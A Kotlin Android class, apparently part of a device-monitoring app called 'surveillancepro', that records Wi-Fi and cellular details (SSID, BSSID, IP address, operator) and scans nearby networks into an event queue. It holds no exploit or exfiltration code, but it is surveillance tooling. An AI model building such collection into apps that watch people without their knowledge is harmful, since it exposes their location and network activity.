package com.surveillancepro.android.services

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.util.Log
import com.surveillancepro.android.data.EventQueue

/**
 * Tracker Wi-Fi pour surveiller les réseaux connectés.
 * Capture le SSID, BSSID, force du signal, et type de connexion.
 */
class WifiTracker(private val context: Context) {

    private val TAG = "WifiTracker"
    private val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    private val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    /**
     * Capture l'état actuel du réseau et l'envoie dans la queue.
     */
    fun captureNetworkState(queue: EventQueue) {
        try {
            val networkInfo = getNetworkInfo()
            if (networkInfo.isNotEmpty()) {
                queue.enqueue("network_state", networkInfo)
                Log.d(TAG, "Network state captured: ${networkInfo["connectionType"]}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to capture network state: ${e.message}")
        }
    }

    /**
     * Récupère les informations réseau actuelles.
     */
    fun getNetworkInfo(): Map<String, Any?> {
        val result = mutableMapOf<String, Any?>()

        try {
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)

            result["isConnected"] = network != null
            result["timestamp"] = System.currentTimeMillis()

            if (capabilities != null) {
                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                        result["connectionType"] = "wifi"
                        captureWifiDetails(result)
                    }
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                        result["connectionType"] = "cellular"
                        captureCellularDetails(result)
                    }
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> {
                        result["connectionType"] = "ethernet"
                    }
                    else -> {
                        result["connectionType"] = "other"
                    }
                }

                result["hasInternet"] = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                result["isValidated"] = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
            } else {
                result["connectionType"] = "none"
                result["hasInternet"] = false
            }

        } catch (e: Exception) {
            Log.w(TAG, "Error getting network info: ${e.message}")
            result["error"] = e.message
        }

        return result
    }

    @Suppress("DEPRECATION")
    private fun captureWifiDetails(result: MutableMap<String, Any?>) {
        try {
            val wifiInfo = wifiManager.connectionInfo
            if (wifiInfo != null) {
                val ssid = wifiInfo.ssid?.replace("\"", "") ?: "Unknown"
                result["ssid"] = if (ssid == "<unknown ssid>") "Hidden Network" else ssid
                result["bssid"] = wifiInfo.bssid ?: "Unknown"
                result["rssi"] = wifiInfo.rssi
                result["signalStrength"] = WifiManager.calculateSignalLevel(wifiInfo.rssi, 5)
                result["linkSpeed"] = "${wifiInfo.linkSpeed} Mbps"
                result["frequency"] = "${wifiInfo.frequency} MHz"
                result["ipAddress"] = intToIp(wifiInfo.ipAddress)
                
                // Niveau de signal en texte
                result["signalQuality"] = when (WifiManager.calculateSignalLevel(wifiInfo.rssi, 5)) {
                    4 -> "Excellent"
                    3 -> "Bon"
                    2 -> "Moyen"
                    1 -> "Faible"
                    else -> "Très faible"
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error getting WiFi details: ${e.message}")
        }
    }

    private fun captureCellularDetails(result: MutableMap<String, Any?>) {
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            result["operator"] = telephonyManager.networkOperatorName ?: "Unknown"
            result["networkType"] = getNetworkTypeName(telephonyManager.dataNetworkType)
        } catch (e: Exception) {
            Log.w(TAG, "Error getting cellular details: ${e.message}")
        }
    }

    private fun getNetworkTypeName(type: Int): String {
        return when (type) {
            android.telephony.TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"
            android.telephony.TelephonyManager.NETWORK_TYPE_NR -> "5G"
            android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP,
            android.telephony.TelephonyManager.NETWORK_TYPE_HSPA -> "3G+"
            android.telephony.TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
            android.telephony.TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"
            android.telephony.TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"
            else -> "Unknown ($type)"
        }
    }

    private fun intToIp(ip: Int): String {
        return "${ip and 0xFF}.${ip shr 8 and 0xFF}.${ip shr 16 and 0xFF}.${ip shr 24 and 0xFF}"
    }

    /**
     * Scan des réseaux Wi-Fi disponibles (nécessite permission LOCATION).
     */
    @Suppress("DEPRECATION")
    fun scanAvailableNetworks(): List<Map<String, Any>> {
        val networks = mutableListOf<Map<String, Any>>()
        try {
            val scanResults = wifiManager.scanResults
            scanResults.take(20).forEach { result ->
                networks.add(mapOf(
                    "ssid" to (result.SSID ?: "Hidden"),
                    "bssid" to result.BSSID,
                    "level" to result.level,
                    "frequency" to result.frequency,
                    "capabilities" to result.capabilities,
                    "isSecure" to !result.capabilities.contains("OPEN")
                ))
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error scanning networks: ${e.message}")
        }
        return networks
    }
}
